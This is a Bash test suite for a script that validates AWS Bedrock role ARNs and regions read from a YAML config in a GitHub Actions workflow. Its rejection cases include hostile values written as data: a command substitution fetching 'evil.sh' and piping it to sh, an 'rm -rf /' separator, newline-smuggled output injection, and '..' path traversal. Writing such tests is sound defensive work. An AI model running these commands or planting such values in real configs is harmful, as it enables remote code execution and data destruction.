#!/usr/bin/env bash
#
# Copyright (c) 2011-present Sonatype, Inc. All rights reserved.
# Includes the third-party code listed at http://links.sonatype.com/products/clm/attributions.
# "Sonatype" is a trademark of Sonatype, Inc.
#
# resolve-bedrock-role_test.sh — unit tests for scripts/resolve-bedrock-role.sh (GUIDE-3302).
#
# resolve-bedrock-role.sh guards its main() behind a BASH_SOURCE check, so this test sources it
# and drives resolve_bedrock_role() directly with config fixtures.
#
# The accept/reject cases mirror the CLI's schema tests
# (agentic-patches-ts/tests/config/schema.test.ts) on purpose: both sides validate the same
# value, and they must not drift.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=/dev/null
source "${SCRIPT_DIR}/resolve-bedrock-role.sh"

# The script parses YAML with python3 + PyYAML (as .github/workflows/test.yml already does).
# Most cases need a working parser, so this is a hard failure rather than a skip - the alternative
# is a pile of confusing diffs. The missing-PyYAML branch itself is covered below via a shim, so
# nothing is lost by requiring the real thing here.
if ! python3 -c 'import yaml' >/dev/null 2>&1; then
  echo "resolve-bedrock-role_test.sh: FAILED - python3 with PyYAML is required to run this suite" >&2
  echo "  install with: python3 -m pip install pyyaml" >&2
  exit 1
fi

TMPDIR_TEST="$(mktemp -d)"
trap 'rm -rf "${TMPDIR_TEST}"' EXIT

fail=0
check() {
  local desc="$1" expected="$2" actual="$3"
  if [ "${expected}" = "${actual}" ]; then
    echo "PASS - ${desc}"
  else
    echo "FAIL - ${desc}"
    echo "  expected: [${expected}]"
    echo "  actual:   [${actual}]"
    fail=1
  fi
}

# write_config <contents> -> path
# Uses a counter rather than mktemp: a suffix after the X's is not portable (BSD mktemp
# rejects it), and every fixture needs a distinct file.
_cfg_seq=0
write_config() {
  _cfg_seq=$((_cfg_seq + 1))
  local f="${TMPDIR_TEST}/agp-${_cfg_seq}.yml"
  printf '%s\n' "$1" >"${f}"
  printf '%s' "${f}"
}

# run_resolve <contents> -> stdout of resolve_bedrock_role (stderr suppressed)
run_resolve() {
  local cfg
  cfg="$(write_config "$1")"
  resolve_bedrock_role "${cfg}" 2>/dev/null || echo "__EXIT_NONZERO__"
}

# ── Applicable: bedrock + valid role ────────────────────────────────────────────
check "emits role and region for a governed bedrock role" \
  "role=arn:aws:iam::123456789012:role/agp-bedrock
region=us-west-2" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp-bedrock
  awsRegion: us-west-2')"

# aws-region is a REQUIRED input of configure-aws-credentials, so emitting a role without one
# would make that action abort with "Input required and not supplied: aws-region" - the opaque
# credential failure this script exists to prevent. Fail where the cause can be named.
check "fails when awsRole is set but awsRegion is missing" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp-bedrock')"

check "fails when awsRegion is present but blank" "__EXIT_NONZERO__" \
  "$(run_resolve "agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp-bedrock
  awsRegion: '   '")"

check "accepts a role with a path" \
  "role=arn:aws:iam::123456789012:role/team/sub/agp
region=us-west-2" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRegion: us-west-2
  awsRole: arn:aws:iam::123456789012:role/team/sub/agp')"

check "accepts the govcloud partition" \
  "role=arn:aws-us-gov:iam::123456789012:role/agp
region=us-gov-west-1" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRegion: us-gov-west-1
  awsRole: arn:aws-us-gov:iam::123456789012:role/agp')"

check "trims surrounding whitespace" \
  "role=arn:aws:iam::123456789012:role/agp
region=us-west-2" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRegion: us-west-2
  awsRole: "  arn:aws:iam::123456789012:role/agp  "')"

# ── Not applicable: emit nothing, exit 0 ────────────────────────────────────────
check "emits nothing for the anthropic provider" "" \
  "$(run_resolve 'agent:
  provider: anthropic
  awsRole: arn:aws:iam::123456789012:role/agp')"

check "emits nothing when provider is unset (CLI default is anthropic)" "" \
  "$(run_resolve 'agent:
  awsRole: arn:aws:iam::123456789012:role/agp')"

check "emits nothing when awsRole is absent" "" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRegion: us-west-2')"

check "treats an empty awsRole as unset (renderer emits empty scalars)" "" \
  "$(run_resolve "agent:
  provider: bedrock
  awsRole: ''
  awsRegion: us-west-2")"

check "emits nothing when there is no agent block at all (agentic mode off)" "" \
  "$(run_resolve 'version: "1"
validation:
  enabled: true')"

check "emits nothing for an empty config" "" "$(run_resolve '')"

check "emits nothing when agent is not a mapping" "" \
  "$(run_resolve 'agent: "yes"')"

check "emits nothing when awsRole is not a string" "" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: 12345')"

check "does not fail on malformed YAML" "" \
  "$(run_resolve 'agent: [unclosed')"

check "does not fail when the config file is missing" "" \
  "$(resolve_bedrock_role "${TMPDIR_TEST}/definitely-absent.yml" 2>/dev/null)"

# ── Invalid ARN: must fail loudly rather than pass a bad value onward ───────────
for bad in \
  'agp-bedrock' \
  'arn:aws:iam::123456789012:user/bob' \
  'arn:aws:iam::123456789012:instance-profile/p' \
  'arn:aws:iam::12345:role/r' \
  'env:AWS_ROLE_TO_ASSUME'; do
  check "rejects invalid ARN [${bad}]" "__EXIT_NONZERO__" \
    "$(run_resolve "agent:
  provider: bedrock
  awsRole: '${bad}'")"
done

# GitHub Actions expression syntax is never expanded here — agp.yml is data fetched at run
# time, not workflow YAML — so it must be rejected rather than passed through literally.
# shellcheck disable=SC2016  # the ${{ }} must stay literal: it is the value under test
check "rejects a GitHub Actions expression" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "${{ secrets.AWS_ROLE_TO_ASSUME }}"')"

# Command substitution / separators must never reach the assume-role input. The value is only
# ever written to GITHUB_OUTPUT (never interpolated into a run: block), but rejecting it here
# is defence in depth for the GUIDE-2953 class of bug.
# shellcheck disable=SC2016  # the $(...) must stay literal: it is the injection attempt
check "rejects command substitution in the role" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r$(curl evil.sh|sh)"')"

check "rejects a shell separator in the role" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r; rm -rf /"')"

check "rejects a newline-smuggled second value" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r\narn:aws:iam::999999999999:role/evil"')"

# A multi-line value must be rejected outright, not truncated to its first line: GITHUB_OUTPUT
# is newline-delimited KEY=VALUE, so emitting one would let a hostile config inject additional
# step outputs.
check "rejects a role containing a real newline (GITHUB_OUTPUT injection)" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r\ninjected=1"')"

check "rejects a role containing a carriage return" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r\rinjected=1"')"

check "rejects a role containing a tab" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: "arn:aws:iam::123456789012:role/r\tx"')"

# ── awsRegion shape ─────────────────────────────────────────────────────────────
# shellcheck disable=SC2016  # ${AWS_REGION} must stay literal: it is the value under test
for bad_region in 'us-east-1 foo' '${AWS_REGION}' 'us-west-2; echo x' 'US-WEST-2' 'uswest2' 'us-west'; do
  check "rejects a malformed awsRegion [${bad_region}]" "__EXIT_NONZERO__" \
    "$(run_resolve "agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp
  awsRegion: '${bad_region}'")"
done

for ok_region in us-west-2 eu-central-1 ap-southeast-1 us-gov-west-1 cn-north-1; do
  check "accepts region [${ok_region}]" \
    "role=arn:aws:iam::123456789012:role/agp
region=${ok_region}" \
    "$(run_resolve "agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp
  awsRegion: ${ok_region}")"
done

# U+2028 / U+2029 are line breaks to any Unicode-aware splitter even though GITHUB_OUTPUT is
# split on \n today, so the guard must match its own "control characters are rejected" claim.
check "rejects a Unicode line separator in the role" "__EXIT_NONZERO__" \
  "$(printf 'agent:\n  provider: bedrock\n  awsRegion: us-west-2\n  awsRole: "arn:aws:iam::123456789012:role/r\\u2028x"\n' > "${TMPDIR_TEST}/u2028.yml"; resolve_bedrock_role "${TMPDIR_TEST}/u2028.yml" 2>/dev/null || echo '__EXIT_NONZERO__')"

# ── config-path containment (mirrors gate.sh's validate_config_path) ─────────────
check "treats an empty config-path as the agp.yml default" "0" \
  "$(CONFIG_PATH='' GITHUB_WORKSPACE="${TMPDIR_TEST}" main >/dev/null 2>&1; echo $?)"

check "rejects an absolute config-path" "__EXIT_NONZERO__" \
  "$(CONFIG_PATH=/etc/agp.yml GITHUB_WORKSPACE="${TMPDIR_TEST}" main 2>/dev/null || echo '__EXIT_NONZERO__')"

check "rejects a config-path with a .. segment" "__EXIT_NONZERO__" \
  "$(CONFIG_PATH=../../etc/agp.yml GITHUB_WORKSPACE="${TMPDIR_TEST}" main 2>/dev/null || echo '__EXIT_NONZERO__')"

check "allows a legitimate name containing dots" "0" \
  "$(CONFIG_PATH=agp..yml GITHUB_WORKSPACE="${TMPDIR_TEST}" main >/dev/null 2>&1; echo $?)"

# ── awsRegion is emitted too, so it needs the same guard as the role ────────────
check "rejects a newline in awsRegion (GITHUB_OUTPUT injection via the region)" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp-bedrock
  awsRegion: "us-west-2\nrole=arn:aws:iam::999999999999:role/evil"')"

check "rejects a carriage return in awsRegion" "__EXIT_NONZERO__" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp-bedrock
  awsRegion: "us-west-2\rx"')"

check "trims surrounding whitespace on awsRegion" \
  "role=arn:aws:iam::123456789012:role/agp
region=us-west-2" \
  "$(run_resolve 'agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp
  awsRegion: "  us-west-2  "')"

# ── Missing-PyYAML branch ───────────────────────────────────────────────────────
# Exercised with a python3 shim earlier on PATH whose `import yaml` fails, so the branch that
# exists precisely for this condition is not the one thing left uncovered. The shim also lets the
# empty-value case be pinned down: an Anthropic repo carrying `awsRole: ''` must NOT be failed for
# a field it never set.
with_broken_pyyaml() {
  local shim_dir="${TMPDIR_TEST}/shim"
  mkdir -p "${shim_dir}"
  cat >"${shim_dir}/python3" <<'SHIM'
#!/usr/bin/env bash
# Fail only the PyYAML probe; anything else behaves like a python3 that cannot parse YAML.
if [ "$1" = "-c" ] && [ "$2" = "import yaml" ]; then
  exit 1
fi
exit 0
SHIM
  chmod +x "${shim_dir}/python3"
  PATH="${shim_dir}:${PATH}" "$@"
}

cfg_with_role="$(write_config 'agent:
  provider: bedrock
  awsRole: arn:aws:iam::123456789012:role/agp-bedrock')"
check "fails loudly when a role is configured but PyYAML is missing" "__EXIT_NONZERO__" \
  "$(with_broken_pyyaml resolve_bedrock_role "${cfg_with_role}" 2>/dev/null || echo '__EXIT_NONZERO__')"

check "names PyYAML in the failure so the remedy is obvious" "0" \
  "$(with_broken_pyyaml resolve_bedrock_role "${cfg_with_role}" 2>&1 >/dev/null | grep -c 'PyYAML' | head -1 | awk '{print ($1>0)?0:1}')"

cfg_empty_role="$(write_config "agent:
  provider: anthropic
  awsRole: ''")"
check "does NOT fail an empty awsRole when PyYAML is missing" "" \
  "$(with_broken_pyyaml resolve_bedrock_role "${cfg_empty_role}" 2>/dev/null || echo '__EXIT_NONZERO__')"

cfg_no_role="$(write_config 'agent:
  provider: anthropic')"
check "does NOT fail a config without awsRole when PyYAML is missing" "" \
  "$(with_broken_pyyaml resolve_bedrock_role "${cfg_no_role}" 2>/dev/null || echo '__EXIT_NONZERO__')"

# ── Drift guard against the CLI ─────────────────────────────────────────────────
# The regex here must stay equivalent to IAM_ROLE_ARN_RE in
# agentic-patches-ts/src/config/schema.ts. This asserts the shape rather than the exact text,
# since one is ERE and the other JavaScript.
pattern_anchored() {
  case "${IAM_ROLE_ARN_RE}" in
    '^'*'$') echo anchored ;;
    *) echo unanchored ;;
  esac
}
pattern_has_account_id() {
  case "${IAM_ROLE_ARN_RE}" in
    *'[0-9]{12}'*) echo present ;;
    *) echo missing ;;
  esac
}
check "ARN pattern is anchored at both ends" "anchored" "$(pattern_anchored)"
check "ARN pattern requires a 12-digit account id" "present" "$(pattern_has_account_id)"

if [ "${fail}" -ne 0 ]; then
  echo "resolve-bedrock-role_test.sh: FAILURES"
  exit 1
fi
echo "resolve-bedrock-role_test.sh: all tests passed"
